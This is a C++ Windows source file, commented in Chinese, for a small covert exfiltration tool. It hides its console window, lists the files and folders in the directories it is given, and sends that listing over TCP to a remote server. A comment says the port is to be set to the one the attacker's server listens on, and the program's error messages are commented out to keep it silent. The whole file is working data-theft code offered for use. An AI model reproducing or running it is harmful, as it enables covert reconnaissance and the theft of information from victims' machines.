#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <dirent.h>
#include <string.h>
#include <errno.h>
#include <locale.h>
#include <iostream>
#include <format>

// 需要与 Ws2_32.lib、Mswsock.lib 和 Advapi32.lib 链接
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Mswsock.lib")
#pragma comment(lib, "AdvApi32.lib")

#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "27015"	// 端口需要改成攻击者服务器监听的端口

std::string list_directory(const char* dirname);


int __cdecl main(int argc, char** argv)
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	std::string sendbuf = "";
	char * uncheckdirname;
	
	/* 选择默认语言环境 */
	setlocale(LC_ALL, "LC_CTYPE=.utf8");

	// 验证参数,支持一次传入多个目录名，目录名需要用双引号括起来，参数之间以空格进行分隔
	if (argc < 2)
	{
		// printf("usage: %s server-name [\"dirname1\"][\"dirname2\"] ...[\"dirname n\"]\n", argv[0]);
		return 1;
	}

	/* 对于命令行中每个目录 */
	int i = 2;
	while (i < argc)
	{
		//TODO: 在这里加入对第二个之后的参数是否带有双引号的判断
		sendbuf += list_directory(argv[i]);
		i++;
	}

	/* 如果命令行上没有目录参数，则列出当前工作目录 */
	if (argc == 2)
	{
		sendbuf += list_directory(".");
	}

	
	WSADATA wsaData;
	SOCKET ConnectSocket = INVALID_SOCKET;
	struct addrinfo* result = NULL,
		* ptr = NULL,
		hints;
	char recvbuf[DEFAULT_BUFLEN];
	int iResult;
	int recvbuflen = DEFAULT_BUFLEN;


	// 初始化 Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0)
	{
		// printf("WSAStartup failed with error: %d\n", iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// 解析服务器地址和端口
	iResult = getaddrinfo(argv[1], DEFAULT_PORT, &hints, &result);
	if (iResult != 0)
	{
		// printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		return 1;
	}

	// 尝试连接地址直到成功
	for ( ptr = result; ptr != NULL; ptr=ptr->ai_next)
	{
		// 创建用于连接到服务器的 SOCKET
		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
		if (ConnectSocket == INVALID_SOCKET)
		{
			// printf("socket failed with error: %ld\n", WSAGetLastError());
			WSACleanup();
			return 1;
		}

		// 连接到服务器
		iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == INVALID_SOCKET)
		{
			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;
			continue;
		}
		break;
	}

	freeaddrinfo(result);

	if (ConnectSocket == INVALID_SOCKET)
	{
		// printf("Unable to connect to server!\n");
		WSACleanup();
		return 1;
	}

	// 发送初始缓冲区
	
	iResult = send(ConnectSocket, sendbuf.c_str(), (int)strlen(sendbuf.c_str()), 0);
	if (iResult == SOCKET_ERROR)
	{
		// printf("send failed with error: %d\n", WSAGetLastError());
		closesocket(ConnectSocket);
		WSACleanup();
		return 1;
	}
	// printf("Bytes Sent: %ld\n", iResult);

	// 关闭连接，因为不会发送更多数据
	iResult = shutdown(ConnectSocket, SD_SEND);
	if (iResult == SOCKET_ERROR)
	{
		// printf("shutdown failed with error: %d\n", WSAGetLastError());
		closesocket(ConnectSocket);
		WSACleanup();
		return 1;
	}

	// 接收直到对等方关闭连接
	do
	{
		iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
		if (iResult > 0)
		{
			// printf("Bytes received: %d\n", iResult);
		}
		else if(iResult == 0){
			// printf("Connection closed\n");
		}
		else
		{
			// printf("recv failed with error: %d\n", iResult);
		}

	} while (iResult > 0);

	// 清理
	closesocket(ConnectSocket);
	WSACleanup();
	return EXIT_SUCCESS;
}


/* 列出目录中的文件和目录 */
std::string list_directory(const char* dirname)
{
	/* 打开目录流 */
	DIR* dir = opendir(dirname);
	if (!dir)
	{
		/* 无法打开目录 */
		return(std::format("Cannot open {} ({})\n", dirname, strerror(errno)));
		exit(EXIT_FAILURE);
	}

	/* 打印目录中的所有文件和目录 */
	struct dirent* ent;
	std::string dirsandfiles = "";	//目录中文件和目录名字的拼接字符串
	std::string dirinfo = "";	// 提示当前正在打印指定目录中的目录和文件名字
	while ((ent = readdir(dir)) != NULL)
	{
		switch (ent->d_type)
		{
		case DT_REG:
			dirsandfiles += std::format("{}\n", ent->d_name);
			break;
		case DT_DIR:
			dirsandfiles += std::format("{}\n", ent->d_name);
			break;
		case DT_LNK:
			dirsandfiles += std::format("{}@\n", ent->d_name);
			break;
		default:
			dirsandfiles += std::format("{}*\n", ent->d_name);
		}
	}
	closedir(dir);
	dirinfo = std::format("[The contents of directory '{}']\n", dirname);
	return std::format("{}{}\n", dirinfo, dirsandfiles);
}
